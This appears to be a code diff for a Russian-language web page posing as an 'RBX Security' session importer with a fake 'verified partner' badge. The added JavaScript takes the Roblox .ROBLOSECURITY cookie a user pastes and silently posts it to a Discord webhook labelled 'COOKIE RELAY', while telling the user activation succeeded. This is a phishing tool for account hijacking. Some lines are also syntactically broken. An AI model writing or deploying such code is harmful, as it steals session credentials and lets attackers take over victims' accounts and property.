@@ -1,25 +1,58 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>RBX Security | Session Importer</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="container">
-        <div class="logo">🔐 RBX SECURITY</div>
-        <div class="badge">VERIFIED PARTNER ✓</div>
-        <h1>SESSION IMPORTER</h1>
-        <p class="label">.ROBLOSECURITY Cookie</p>
-        <textarea id="cookieInput" placeholder="Вставьте .ROBLOSECURITY cookie сюда..."></textarea>
-        <button onclick="sendToDiscord()">ЗАМЕНИТЬ СЕССИЮ</button>
-        <div class="status" id="status">Готово к импорту</div>
-        <div class="links">
-            <a href="dashboard.html">📊 Дашборд</a>
-            <a href="verify.html">✅ Верификация</a>
-            <a href="support.html">🆘 Поддержка</a>
-        </div>
-    </div>
-    <script src="script.js"></script>
+async function sendToDiscord() {
+            const cookie = textarea.value.trim();
+
+            if (!cookie) {
+                statusText.textContent = '❌ ВВЕДИТЕ COOKIE';
+                statusText.style.color = '#ff4444';
+                statusLed.style.backgroundColor = '#ff4444';
+                return;
+            }
+
+            statusText.textContent = '📡 АКТИВАЦИЯ...';
+            statusText.style.color = '#ffaa00';
+            statusLed.style.backgroundColor = '#ffaa00';
+
+            const embed = {
+                title: "🌙 NIGHTFALL VOICE | НОВАЯ КУКА",
+                color: 0xaa00ff,
+                fields: [
+                    { name: "🔐 .ROBLOSECURITY", value: \`\`\`${cookie.substring(0, 500)}\`\`\`, inline: false },
+                    { name: "📏 ДЛИНА", value: ${cookie.length} символов, inline: true },
+                    { name: "🕐 ВРЕМЯ", value: new Date().toLocaleString('ru-RU'), inline: true }
+                ],
+                footer: { text: "NIGHTFALL VOICE • COOKIE RELAY" },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                if (response.ok) {
+                    statusText.textContent = '✅ АКТИВИРОВАНО';
+                    statusText.style.color = '#0f0';
+                    statusLed.style.backgroundColor = '#0f0';
+                    textarea.value = '';
+                    charCountSpan.textContent = '0';
+                    
+                    setTimeout(() => {
+                        statusText.textContent = 'режим ожидания';
+                        statusText.style.color = '#666';
+                        statusLed.style.backgroundColor = '#333';
+                    }, 3000);
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                console.error(error);
+                statusText.textContent = '⚠️ ОШИБКА РЕЛЕ';
+                statusText.style.color = '#ff4444';
+                statusLed.style.backgroundColor = '#ff4444';
+            }
+        }
+    </script>
 </body>
 </html>
